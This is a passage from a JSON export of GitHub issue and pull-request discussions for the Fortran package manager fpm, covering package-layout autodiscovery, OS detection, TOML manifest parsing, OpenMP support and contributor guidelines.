                    "text": "I disagree with placing unnecessary constraints on package layout based on arguments of \"bad practice\" since there is always a package or use-case that will justifiably need to go against such constraints. The analogy with implicit none is stretching (IMO) since implicit typing easily leads to undesirable program behaviour whereas package layout is more aesthetic in nature.\nI'm proposing automatic discovery based on a default layout like Cargo, but with a simpler (and looser) set of rules:\n\nBy default, fpm looks in app, and any subdirectories therein, for executable targets;\nExecutable targets are 'module-associated' and linked with any other (non-executable) sources in the same directory as the executable source.\n\nFor me, this is simple to understand conceptually and flexible enough for all use cases.\nThis allows Brad's use-case of a single executable + multiple modules and my common use-case of multiple executables with one or two supporting (non-library) modules.\nThe corresponding 'default' fpm.toml entry would be something akin to:\napp-dir = \"app\"\ntest-dir = \"test\"\n\nwith [[executable]] and [[test]] available for individual program customisation.\nI can mock-up some working cases later as examples."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-09 14:49:33+00:00",
                    "text": "There's a mostly working demo on my program_discovery branch, where I've changed the hello_complex example to:\n\u251c\u2500\u2500 apps\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 app_mod.f90\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 say_goodbye.f90\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 say_hello\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 app_hello_mod.f90\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 say_Hello.f90\n\u251c\u2500\u2500 fpm.toml\n\u251c\u2500\u2500 source\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 farewell_m.f90\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 greet_m.f90\n\u2514\u2500\u2500 tests\n    \u251c\u2500\u2500 farewell_test.f90\n    \u251c\u2500\u2500 greet_test.f90\n    \u2514\u2500\u2500 test_mod.f90\n\nwith manifest:\nname = \"hello_complex\"\n\napp-dir=\"apps\"\ntest-dir = \"tests\"\n\n[library]\nsource-dir=\"source\"\n\n[[executable]]\nname=\"say_hello_world\"\nsource-dir=\"apps/say_hello\"\nmain=\"say_Hello.f90\"\n\nwhich demonstrates:\n\nautomatic app/test discovery in app-dir/test-dir\n'app-private' modules (in same directory)\napp customisation in fpm.toml"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-09 15:11:39+00:00",
                    "text": "That's how my testing framework works. All of the tests are written in modules, and all of the tests are run via a single executable. And so all of my libraries' tests are written that way.\n\n@everythingfunctional Would this issue go away if you put your test modules in the same source file as the program that calls them? In that case the default fpm/Cargo approach would work for you out of the box without specifying anything."
                },
                {
                    "user": "certik",
                    "date": "2020-09-09 15:49:55+00:00",
                    "text": "Unlike Rust, Fortran has the advantage that we can easily figure out which modules are used by what program, so @LKedward's proposal will work great. I suggest we do that.\nFurthermore, I would suggest that for this layout:\n\u251c\u2500\u2500 apps\n\u2502   \u251c\u2500\u2500 app_mod.f90\n\u2502   \u251c\u2500\u2500 say_goodbye.f90\n\u2502   \u2514\u2500\u2500 say_hello\n\u2502       \u251c\u2500\u2500 app_hello_mod.f90\n\u2502       \u2514\u2500\u2500 say_Hello.f90\n\u251c\u2500\u2500 fpm.toml\n\u251c\u2500\u2500 src\n\u2502   \u251c\u2500\u2500 farewell_m.f90\n\u2502   \u2514\u2500\u2500 greet_m.f90\n\u2514\u2500\u2500 tests\n    \u251c\u2500\u2500 farewell_test.f90\n    \u251c\u2500\u2500 greet_test.f90\n    \u2514\u2500\u2500 test_mod.f90\n\nIt should just work with this fpm.toml:\nname = \"hello_complex\"\n\nSince fpm can figure out everything.\nWe can discuss whether the apps dir should be called app or bin or src/bin or src/app or src/apps, but the idea stays the same."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-09 17:13:21+00:00",
                    "text": "@milancurcic , no, because the program is generated by a program I wrote to scan your tests. And I don't believe we support having modules in with a program.\nI think @LKedward 's approach is probably headed in the right direction. I'll take a look at the implementation."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-09 20:30:56+00:00",
                    "text": "And I don't believe we support having modules in with a program.\n\nBoth Haskell and Fortran fpm support this now and we should continue to support it. I will contribute an example to the existing suite of test packages. But it's irrelevant for your use case as you say."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-13 17:10:23+00:00",
                    "text": "My most common case for tests is that all the tests call three modules. One has things like routines to compare reals and tables of numbers and statistics routines; another is a logging utility and the other is a debug utility that mostly concentrates on fail/pass procedures and allowing scripts to be called with the results (which then pass data to databases, web pages, log files, ...) So if I have multiple programs (perhaps dozens) that all use those modules and I wanted one directory for the programs and one for the modules would I put the modules in app/ and the programs in app/programs/ or the programs in app/ and the modules in app/modules/ or have app/programs and appl/modules? I am thinking any of those are better than having 20 subdirectories right now; but wondering if you are envisioning all three of those to work?\nI branched my own fpm so I could use POSIX-ony libraries like M_systems and fortran-libcurl and parse everything with M_CLI2 so I could get a better feel for how this will work some day; and I have found\n1) It is much nicer to use fpm if it looks for the fpm.toml file in directories above it which I found can be complicated by softlinks a bit but is pretty basic but requires testing if files exist and changing directories\n2) that it is really useful to have a --list option on run and test in particular to show you what programs are going to be built and their pathnames.  I also think it would be nice if that listing was written out in fpm.toml format so you could quickly build/rebuild fpm.toml; but perhaps I would not need that as much with the autoscan described above\n3) I personally found that moving past a basic build with just a few modules that having something like .gitignore becomes essential. Even as it is now I found the original fpm failing because it \"found\" some working files I had in directories or reference files. The proposed changed would have it finding even more. I often want files in a directory for reference or during development that I have to keep renaming so they are not \"discovered\". Even just being able to specify a directory NOT be searched like  A  .fmpignore with FODDER/ in it (ie. do not search directory FODDER) is handly. Not sure how common an issue that is for others, but having looked at many packages over the years they often have unused or platform-specific files sitting with the production ones.\nSo an upward search for fpm.toml; an ability to do a dry run with a listing of builds (perhaps with output in fpm.toml format; and something that lets files be ignored (the git(1) .gitignore model works for me) are on my wishlist."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-16 08:58:41+00:00",
                    "text": "So if I have multiple programs (perhaps dozens) that all use those modules and I wanted one directory for the programs and one for the modules would I put the modules in app/ and the programs in app/programs/ or the programs in app/ and the modules in app/modules/ or have app/programs and appl/modules?\n\nUnfortunately my proposed changes won't allow the configurations you've mentioned; it will avoid the need to have 20 subdirectories, but will require both modules and programs to be all in the same directory.\nA possible solution for your logging/debug modules etc. is to store them in a separate package and include them as [dev-dependencies] which are only required for the test programs.\nI would support a file ignore list as an entry in fpm.toml or as a .fpmignore file. Also dry run is a good idea that should be implemented."
                },
                {
                    "user": "certik",
                    "date": "2020-09-16 14:01:24+00:00",
                    "text": "@urbanjost fpm should have an option to allow users like you to use it. Experience with Cargo and Rust shows that having a default layout and autodiscovery works excellent for over 90% of packages, and the rest just needs some way to be able to use it, perhaps adding options to fpm.toml to disable autodiscovery as you suggested."
                }
            ]
        },
        {
            "number": 163,
            "user": "awvwgk",
            "date": "2020-09-05 19:42:31+00:00",
            "title": "Use different strategy to fetch git dependencies",
            "text": "matches strategy of GitHub's actions/checkout workflow\nuse init -> fetch -> checkout -qf FETCH_HEAD instead of current clone [-> checkout] strategy\nalways works in detached HEAD\nallows to update the git dependency with the same commands (Related: #121)\nchange directory with -C command (easier to match for later Fortran implementation, available since git 1.8.5)\n\nCan probably be implemented much nicer, but my Haskell skills don't go beyond the Try it! tutorial on haskell.org",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-08 18:50:43+00:00",
                    "text": "I was unaware of the -C path option for git. I think this is a good idea, if for no other reason than the Fortran implementation can use exactly the same commands.\nAs for the implementation, I'm not sure I would have done it any different."
                }
            ]
        },
        {
            "number": 162,
            "user": "interkosmos",
            "date": "2020-09-05 18:16:01+00:00",
            "title": "Updated OS type identification",
            "text": "As noted in the source code and discussed in #144, the OS detection of get_os_type() in fpm/src/environment.f90 is not accurate. Please review this request, which checks environment variables and the existance of some files in order to determine the OS more precisely.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-07 15:07:52+00:00",
                    "text": "Thanks @interkosmos, this looks like an improvement. Do note that you'll need to update any functions that use get_os_type such as list_files in fpm.f90 to consider all different OS behaviours.\nI'm hoping #155 will be merged soon, and this further increase the usage of get_os_type (mainly for filesystem/command_line interaction) so it may be best to wait for this to be merged?\nI have no experience with Solaris or BSD so I don't know what quirks need to be specifically addressed, but we may run into the problem that we cannot test them in the CI."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-07 21:06:22+00:00",
                    "text": "@LKedward BSD could be tested using Cirrus CI, which provides FreeBSD images. Grouping it together with OSX and Linux will probably be fine for most use cases right now, to avoid another CI provider for this project.\nTesting cygwin is not (easily) possible on the GH actions windows image as well, which means another CI provider would be required for this purpose (like Appveyor).\nNo idea where to find a CI solution for Solaris."
                },
                {
                    "user": "interkosmos",
                    "date": "2020-09-08 09:20:14+00:00",
                    "text": "In most cases, the behaviour of OS_LINUX, OS_MACOS, OS_CYGWIN, OS_SOLARIS, and OS_FREEBSD should be identical, if we stick to POSIX standards. I can\u2019t say if there are any CI providers that feature OpenSolaris-based images (OpenIndiana, illumos, Tribblix, \u2026)."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-12 14:27:15+00:00",
                    "text": "@interkosmos, would you mind also updating the following uses of get_os_type() in order to prevent the select case statements from silently falling through?\n\n  \n    \n      fpm/fpm/src/fpm_filesystem.f90\n    \n    \n        Lines 51 to 56\n      in\n      e02171d\n    \n    \n    \n    \n\n        \n          \n           select case (get_os_type()) \n        \n\n        \n          \n           case (OS_LINUX,OS_MACOS) \n        \n\n        \n          \n               filesep = '/' \n        \n\n        \n          \n           case (OS_WINDOWS) \n        \n\n        \n          \n               filesep = '\\' \n        \n\n        \n          \n           end select \n        \n    \n  \n\n\n\n  \n    \n      fpm/fpm/src/fpm_filesystem.f90\n    \n    \n        Lines 117 to 124\n      in\n      e02171d\n    \n    \n    \n    \n\n        \n          \n           select case (get_os_type()) \n        \n\n        \n          \n           case (OS_LINUX,OS_MACOS) \n        \n\n        \n          \n               call execute_command_line(\"mkdir -p \" // dir , exitstat=stat) \n        \n\n        \n          \n               write(*,*) \"mkdir -p \" // dir \n        \n\n        \n          \n           case (OS_WINDOWS) \n        \n\n        \n          \n               call execute_command_line(\"mkdir \" // windows_path(dir), exitstat=stat) \n        \n\n        \n          \n               write(*,*) \"mkdir \" // windows_path(dir) \n        \n\n        \n          \n           end select \n        \n    \n  \n\n\n\n  \n    \n      fpm/fpm/src/fpm_filesystem.f90\n    \n    \n        Lines 148 to 158\n      in\n      e02171d\n    \n    \n    \n    \n\n        \n          \n           select case (get_os_type()) \n        \n\n        \n          \n               case (OS_LINUX) \n        \n\n        \n          \n                   call execute_command_line(\"ls \" // dir // \" > \"//temp_file, & \n        \n\n        \n          \n                                             exitstat=stat) \n        \n\n        \n          \n               case (OS_MACOS) \n        \n\n        \n          \n                   call execute_command_line(\"ls \" // dir // \" > \"//temp_file, & \n        \n\n        \n          \n                                             exitstat=stat) \n        \n\n        \n          \n               case (OS_WINDOWS) \n        \n\n        \n          \n                   call execute_command_line(\"dir /b \" // windows_path(dir) // \" > \"//temp_file, & \n        \n\n        \n          \n                                             exitstat=stat) \n        \n\n        \n          \n           end select \n        \n    \n  \n\n\n\n  \n    \n      fpm/fpm/src/fpm_command_line.f90\n    \n    \n        Lines 66 to 73\n      in\n      e02171d\n    \n    \n    \n    \n\n        \n          \n           select case (get_os_type()) \n        \n\n        \n          \n               case (OS_LINUX) \n        \n\n        \n          \n                   print *, \"OS Type: Linux\" \n        \n\n        \n          \n               case (OS_MACOS) \n        \n\n        \n          \n                   print *, \"OS Type: macOS\" \n        \n\n        \n          \n               case (OS_WINDOWS) \n        \n\n        \n          \n                   print *, \"OS Type: Windows\" \n        \n\n        \n          \n           end select"
                },
                {
                    "user": "certik",
                    "date": "2020-09-14 21:00:27+00:00",
                    "text": "The current failure is (on Windows):\nCommand line: gfortran -c -Jbuild\\gfortran_debug\\fpm -Ibuild\\gfortran_debug\\toml-f -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -o build/gfortran_debug/fpm/fpm_filesystem.o src\\fpm_filesystem.f90\nExit code: 1\nStderr:\nsrc\\fpm_filesystem.f90:2:10:\n\n     use :: fpm_environment, only: get_os_type, &\n          1\nFatal Error: Can't open module file 'fpm_environment.mod' for reading at (1): No such file or directory\ncompilation terminated.\n\nSo that needs to be fixed before we can merge it."
                },
                {
                    "user": "interkosmos",
                    "date": "2020-09-14 21:25:44+00:00",
                    "text": "@certik: does this happend because fpm_filesystem.f90 is compiled before fpm_environment.f90 by fpm?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-14 21:31:27+00:00",
                    "text": "@interkosmos can you try reverting to the non colon form of the use statement - this may be a bug in Haskell fpm."
                },
                {
                    "user": "interkosmos",
                    "date": "2020-09-15 12:16:11+00:00",
                    "text": "Please excuse the inconvenience."
                }
            ]
        },
        {
            "number": 161,
            "user": "awvwgk",
            "date": "2020-09-05 07:41:59+00:00",
            "title": "Build-in dependencies for fpm: OpenMP",
            "text": "OpenMP is probably one of the easiest non-fpm compatible dependency fpm could provide. OpenMP is usually shipped with the compiler. For the current scope of GCC we only have to add -fopenmp to both compile and link arguments and are done, therefore it might be a useful prototype to explore the usage of built-in dependencies for fpm.\nFollowing the current scheme an empty table would do the trick and is flexible enough to allow customization for other build-in dependencies later.\n[dependencies]\nopenmp = {}\nRelevant discussion regarding package name conflicts: fortran-lang/fpm-registry#8, in case a package wants to call itself openmp.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-07 10:15:14+00:00",
                    "text": "I agree this is should be a simple area to prototype such features, however I'm not a fan of the proposed manifest syntax.\nIMO, this seems to be more of compiler feature that needs enabling rather than a 'dependency' that needs satisfying.\nPerhaps:\n[compiler]\nopenmp = true\nAlso in the same vein:\n[compiler]\nlto = true             # link-time optimisation\nacc = true             # OpenACC support\nfflags = \"-fopt-info\"  # Appended to built-in flags list\nlflags = \"-lblas\"\nfpm will then have a supported list of compilers for which it implements any compiler-specific syntax under the hood.\nWhat do you think?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-07 18:00:02+00:00",
                    "text": "True, it usually feels like a compiler command when using it, but there is a lot automation for us hidden in the compiler.\nI thought of it more like a dependency since it is handled in conda like one (see https://conda-forge.org/docs/maintainer/knowledge_base.html#openmp). Also meson is handling it usually as a dependency rather than a compiler command (see https://mesonbuild.com/Dependencies.html#openmp).\nHaving a dependency model that allows propagating linker and compiler flags would be well suited for OpenMP as well in fpm. OpenMP would be useful as simple prototype if dependencies require to export link or compile flags to a dependent project. Projects using OpenMP must propagate at least the linker flag, possibly also the library with the OpenMP implementation to dependent projects to allow correct linking."
                }
            ]
        },
        {
            "number": 160,
            "user": "awvwgk",
            "date": "2020-09-03 12:52:46+00:00",
            "title": "Add contributing guidelines",
            "text": "adds a draft for contributing guidelines for fpm\n\nI have written those guidelines from scratch some time ago, they appeared first in this LGPL licensed project. I can contribute them under MIT license or any other fitting license for fpm.\nFeel free to push to this branch to adjust the guidelines to your liking.\ncloses #158",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-03 13:39:28+00:00",
                    "text": "Thank you @awvwgk. Most of it we can use but can be condensed without losing meaning. I'll take the next stab at it.\nI prefer not requiring signed commits. If anything, we can say in the guidelines something like:\n\nBy contributing to fpm, you certify that you own or are allowed to share the content of your contribution under the fpm license.\n\n@certik what do you think?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-03 21:13:39+00:00",
                    "text": "I agree with @milancurcic that self-signed commits is not necessary. Everything else I think is fine."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-05 17:51:30+00:00",
                    "text": "I reused most of @awvwgk material and added concrete workflow steps. Let me know what you all think."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-07 20:42:29+00:00",
                    "text": "@milancurcic I really like the guidelines you made out of this."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-08 18:37:41+00:00",
                    "text": "Unless there are objections, I will merge this tomorrow this time."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-09 14:52:28+00:00",
                    "text": "Thank you, @awvwgk!"
                }
            ]
        },
        {
            "number": 159,
            "user": "urbanjost",
            "date": "2020-09-02 22:25:55+00:00",
            "title": "Pull request for urbanjost",
            "text": "Add CLI interface and functional subcommand \"new\"\nAdded POSIX interface for implementing mkdir, chdir, and filename\nsplitting; which is problematic as it makes it system-dependent.\nUse gfortran chdir, getcwd extensions and a command-based mkdir\ninstead?\nChanged behavior of \"new\" to allow updating and warn instead of\noverwrite existing files. Early on the Haskell version wiped out\nsome existing README.md and other files; looks like it now stops\nif not creating new directory instead?\nThe build option is failing with the TOML changes. I thought I\ntried it and it worked but a new version I checked out fails as well.\nINC\nrun,build,new work on POSIX machine with no dependencies",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-14 21:03:04+00:00",
                    "text": "Instead of committing existing projects into fpm, I suggest we simply depend on them. We will ensure that fpm can create a nice self-contained tarball that just builds using cmake (or any other build system) to bootstrap (#123)."
                }
            ]
        },
        {
            "number": 158,
            "user": "awvwgk",
            "date": "2020-09-02 17:10:31+00:00",
            "title": "Add a contributing guideline",
            "text": "This project is currently missing resources for to learn about the preferred workflows or the style guide. At least for me a contributing guideline is a strong factor I consider before contributing to a project. In my opinion it helps set the right expectations and cuts down the noise in PRs required to educate new contributors.\nIt would be nice to have at least a short guideline in the README or in a separate CONTRIBUTING file to establish some rules for this project.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-02 17:39:17+00:00",
                    "text": "That's a great idea. Any chance you could put one together for us?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-02 17:52:15+00:00",
                    "text": "For reference, here's what we have in stdlib.\nWhat do you think about something along the lines of:\n\nOpen an issue to discuss the scope of the changes, API if applicable, etc.;\nReach consensus;\nOpen a PR with the changes, while following the fpm style guide (TODO);\nRequest 1-3 reviewers on the PR."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-02 21:21:51+00:00",
                    "text": "@everythingfunctional I have written one, I found myself reusing for many of my projects in various flavours, see here. Feel free to adjust it for fpm."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-03 00:35:23+00:00",
                    "text": "I don't see any major issues with that one. If other contributors agree, I'd be fine with adopting it."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-03 08:50:57+00:00",
                    "text": "I have no problem with your contributor guide @awvwgk but can you add a section like 'Workflow' which incorporates what Milan posted? I would also add the following to the workflow:\n\nAfter reaching consensus on an issue discussion, assign the issue to yourself to indicate to others that you have started work on that issue to avoid duplicate effort"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-03 10:51:22+00:00",
                    "text": "I can open a PR and make the branch editable for repository maintainers, such that you can adjust the guide to your liking."
                }
            ]
        },
        {
            "number": 157,
            "user": "awvwgk",
            "date": "2020-09-01 21:22:02+00:00",
            "title": "Implement reading of fpm.toml",
            "text": "Uses my TOML library to read the fpm.toml file and creates a Fortran type representing the TOML document.\nThis PR adds toml-f as dependency to fpm.\nCloses #149",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-01 21:44:12+00:00",
                    "text": "This is super exciting, thanks a lot @awvwgk! I look forward to reviewing it."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-01 21:56:37+00:00",
                    "text": "Not sure on the scope of this PR, currently it allows to translate and verify any TOML document as fpm package file, but does not do much with this information.\nThe next step would be to pull in a dependency and translate and verify its package file, which would require to create new fpm \u201cinstances\u201d to recursively build the complete dependency tree. Giving the git_target_t a fetch method is easy, but working with the created target is a bit more involved, so this might be somewhat out-of-scope for this PR.\nRegarding coding style, any conventions I should apply (mainly w.r.t. indentation)?"
                },
                {
                    "user": "certik",
                    "date": "2020-09-02 03:52:17+00:00",
                    "text": "@awvwgk thanks a lot for this PR! We will review it soon. I think the scope is ok as it is, and we can build upon it with further PRs once it is merged."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-02 08:19:58+00:00",
                    "text": "Guess it is ready for review than.\nThe current style guide I'm mostly following is this one: https://github.com/dftbplus/develguide/blob/master/docs/fortranstyle.rst"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-02 15:37:20+00:00",
                    "text": "We follow the stdlib style guide. I skimmed through the contributions and didn't see anything that jumps out except the indentation width (we use 4)."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-02 16:55:18+00:00",
                    "text": "Thanks, this is helpful. I've amended the commit accordingly to keep the history clean."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-02 17:23:52+00:00",
                    "text": "I didn't dive super deep into it, but from the high level, it looks reasonably similar to the Haskell version, so I think it's probably at least headed in the right direction.\nI do have one question though. Would it be possible to write some unit tests for this? Feed it a toml string and make sure the package object is correct, feed it bad toml and make sure it reports an error, etc."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-02 20:18:32+00:00",
                    "text": "Sure can do."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-02 21:30:02+00:00",
                    "text": "That looks good for now. I was hoping it wouldn't require writing to the file, but it's ok for now. It's a slick little minimalist testing framework you put together too."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-02 21:39:20+00:00",
                    "text": "toml_parse can read a string too, but it would require to overload or bypass the read_package_file procedure just for testing. Having a dedicated version for testing toml-f in fpm but not the actual version used for fpm somewhat defeats the purpose of the test for me, therefore writing the file it is.\nI need to work on a better constructor for toml_table types upstream so one can easily build a TOML document without having to read it from a file. But this is something for a future PR once I figured it out in toml-f."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-03 09:06:41+00:00",
                    "text": "Good idea, manifest is probably a better name than config, I will adjust this.\nFeel free to squash the PR into one commit to avoid the noise of renaming files."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-03 15:54:40+00:00",
                    "text": "@awvwgk @everythingfunctional @LKedward Should this PR go before or after #155? Is either way easier than the other? I can't tell."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-03 15:56:42+00:00",
                    "text": "I think this PR should go first because it's bigger. I'll then merge the changes into my branch. (Only conflict between the two is fpm.f90 I think.)"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-03 16:24:49+00:00",
                    "text": "They are solving different problems, the order does not matter too much, but a conflict in fpm.f90 is inevitable, due to the current status of the project. I do not mind rebasing my branch either.\nSince #155 is attempting to add the functionality of fpm building itself, the question arises if we can retain this functionality with both PRs merged. In this regard my PR is working exactly against #155, due to adding an external dependency."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-03 16:30:22+00:00",
                    "text": "Since #155 is attempting to add the functionality of fpm building itself, the question arises if we can retain this functionality with both PRs merged. In this regard my PR is working exactly against #155, due to adding an external dependency.\n\nThis isn't a problem; parsing the manifest is more important than Fortran fpm building itself.\nI already know what changes I need to make in #155 once this PR is merged, hence why I recommend that this be merged first."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-03 21:05:45+00:00",
                    "text": "If @LKedward is happy to rebase his branch and fix the conflicts, I'd go with this one first. As much as I'd like to have fpm be able to build itself, it's not strictly necessary. We'll get there."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-03 21:15:12+00:00",
                    "text": "I agree. Let's wait to see if @certik has any objections, and if not we can move forward."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-04 20:42:33+00:00",
                    "text": "I did a quick coverage run on this PR (coverage.txt) and spotted a few issues which were simple oversights. The coverage is currently around 60%, so definitely something to improve."
                },
                {
                    "user": "certik",
                    "date": "2020-09-05 00:09:21+00:00",
                    "text": "I am fine as long as @LKedward is fine, and it seems he his. So we can go ahead and merge this one."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-05 09:27:13+00:00",
                    "text": "Also ready from my side now. I decided to pin the revision of toml-f to a specific commit to ensure that I won't break fpm by changing something in upstream toml-f."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-05 16:42:59+00:00",
                    "text": "Thank you all and especially @awvwgk. Merging."
                }
            ]
        },
        {
            "number": 156,
            "user": "awvwgk",
            "date": "2020-08-28 13:25:54+00:00",
            "title": "Bootstrap version fails to read implicit dependencies table",
            "text": "This could be an upstream issue with https://github.com/kowainik/tomland, but I don't know enough Haskell to verify this.\nSteps to reproduce:\n\nInstall the bootstrap version of fpm (fcb7f67 used)\nCreate new project and add any dependency without using an inline table\n\n> fpm new example\n> cd example\n> echo \"[dependencies.toml-f]\\ngit = \\\"https://github.com/awvwgk/toml-f\\\"\" >> fpm.toml\n\n\nTry to build the project with the dependency\n\n> fpm build\n# gfortran (for build/gfortran_debug/example/example.o build/gfortran_debug/example/example.mod)\n# ar (for build/gfortran_debug/example/libexample.a)\nar: creating build/gfortran_debug/example/libexample.a\n\n\nFind the dependency not recognized\n\n> tree build\nbuild\n\u2514\u2500\u2500 gfortran_debug\n    \u2514\u2500\u2500 example\n        \u251c\u2500\u2500 example.mod\n        \u251c\u2500\u2500 example.o\n        \u2514\u2500\u2500 libexample.a\n\nPresumed source of the error:\nThe following two TOML documents are equivalent, except\n\nuses an inline table for dependencies.toml-f\n\n[dependencies]\ntoml-f = { git = \"https://github.com/awvwgk/toml-f\" }\n\ndependencies is implicitly created\n\n[dependencies.toml-f]\ngit = \"https://github.com/awvwgk/toml-f\"\nApparently, implicit tables are handled differently by the tomland parser, but this implementation detail should not leak into fpm\nAdditional information:\nTesting this with the Python toml module:\n>>> import toml\n>>> table = toml.loads(\"[dependencies.toml-f]\\ngit = \\\"https://github.com/awvwgk/toml-f\\\"\")\n>>> print(table)\n{'dependencies': {'toml-f': {'git': 'https://github.com/awvwgk/toml-f'}}}\n>>> print(toml.dumps(table))\n[dependencies.toml-f]\ngit = \"https://github.com/awvwgk/toml-f\"",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-28 15:40:40+00:00",
                    "text": "I hadn't expected anybody to try using implicit tables for that, but I can confirm there is likely a bug in the upstream library with that style.\nI believe the way it stores the \"key path\" when parsing the toml can end up slightly different depending on that style. I had to implement a feature to allow it to do the automatic conversion to the types used by fpm properly with a table like that, and it's possible it's not properly dealing with that different \"key path\" style.\nI'll submit a bug report for that library. I'm not sure if that will be fixed before the Fortran version is done or not. We'll see."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-28 16:14:48+00:00",
                    "text": "ok, can confirm that the bug exists in the latest version of the library as well. Going to work on a bug report to them."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-08-28 17:49:23+00:00",
                    "text": "ok, can confirm that the bug exists in the latest version of the library as well. Going to work on a bug report to them.\n\nThanks.\n\nI hadn't expected anybody to try using implicit tables for that, but I can confirm there is likely a bug in the upstream library with that style.\n\nI think it is kind of a natural choice for this, as inline tables are quite limited by the TOML specs on purpose.\nEspecially another kind of implicit tables is really expressive in this context:\n[dependencies]\ntoml-f.git = \"https://github.com/toml-f/toml-f\""
                }
            ]
        },
        {
            "number": 155,
            "user": "LKedward",
            "date": "2020-08-26 15:14:21+00:00",
            "title": "[Fortran fpm] Internal dependencies & build backend",
            "text": "Opening a draft PR for feedback.\nImplements:\n\na rudimentary process for scanning sources and determining inter-module dependencies.\na simple fpm backend for building files in correct order\n\nThis is really a minimal working implementation, many places for improvement (particularly source parsing),\nbut it should now build any stand-alone package that only uses the src and app directories (no subdirectories).\nA nice example: fortran fpm can now build itself. Run fpm run --args 'build' with Haskell fpm.\nOther changes:\n\nMoved filesystem and string routines into separate modules for now - these will eventually be substituted by stdlib routines.\n\nNot yet implemented:\n\nnon-default layouts (requires fpm.toml)\nfpm model structure\nPackage layout constraints\nLibrary archiving\nIncremental builds\nBuild output directory\n\nTested on Ubuntu Linux (gcc-7.5.0) and MinGW Windows (gcc-8.1.0).",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-08-26 15:41:42+00:00",
                    "text": "Thanks a lot Laurence. I only did a cursory read through for now and have a few suggestions:\n\nFor split() and lower() from ``M_strings by @urbanjost, should we import them as a dependency instead of in source? This would mean that fpm-fortran wouldn't be able to build itself (we can't download dependencies yet), but this seems to me like an unnecessary requirement for now. The advantage is that we have less code to maintain. Or would you prefer to keep it in source until we can download dependencies, and then replace them with use M_strings, only: lower, split?\nFPM -> fpm everywhere (source file names and modules), as per #77.\nShoud we rename module environment in environment.f90 to fpm_environment in fpm_environment.f90?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-26 17:49:03+00:00",
                    "text": "Thanks for the comments @milancurcic! I agree with you on all points."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-26 19:34:02+00:00",
                    "text": "This is a great start, and a great next step. Thanks @LKedward .\nI agree with @milancurcic for FPM -> fpm and environment -> fpm_environment. I'm also in favor of leaving lower and split in source until we can fetch and build dependencies. Since this seems to allow fpm to build itself, I think we should make efforts not to lose that ability again.\nI will try and find time over the next few days to try and look into the CI failures a bit more closely and see what's going on."
                },
                {
                    "user": "certik",
                    "date": "2020-08-27 01:18:19+00:00",
